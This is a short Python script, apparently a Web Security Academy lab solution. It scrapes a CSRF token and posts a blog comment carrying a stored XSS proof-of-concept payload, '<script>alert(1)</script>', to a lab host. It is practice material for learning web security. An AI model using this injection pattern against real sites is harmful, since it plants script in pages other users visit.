import requests
from urllib.parse import urljoin
from requests.cookies import RequestsCookieJar
from typing import Tuple, Text, Union
import bs4
from bs4 import BeautifulSoup



base_url = 'https://ace51f7b1ff3ccc0c0d4439800d000ea.web-security-academy.net/'

def scrape_csrf(url: Union[Text, bytes]) -> Tuple[str, RequestsCookieJar]:
    get_response = requests.get(url)
    html = get_response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    csrf_input = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf_input['value']
    return csrf_token, get_response.cookies


def post_comment(payload: str) -> str:
    token, cookies = scrape_csrf(urljoin(base_url, 'post?postId=2'))
    data = {
      'csrf': token,
      'postId': '2',
      'comment': payload,
      'name': 'blub',
      'email': 'bla@blub.invalid',
      'website': 'http://bla.invalid'
    }
    response = requests.post(urljoin(base_url, '/post/comment'), data=data, cookies=cookies)
    return response.content.decode('utf-8')


payload = '<script>alert(1)</script>'

print(post_comment(payload))
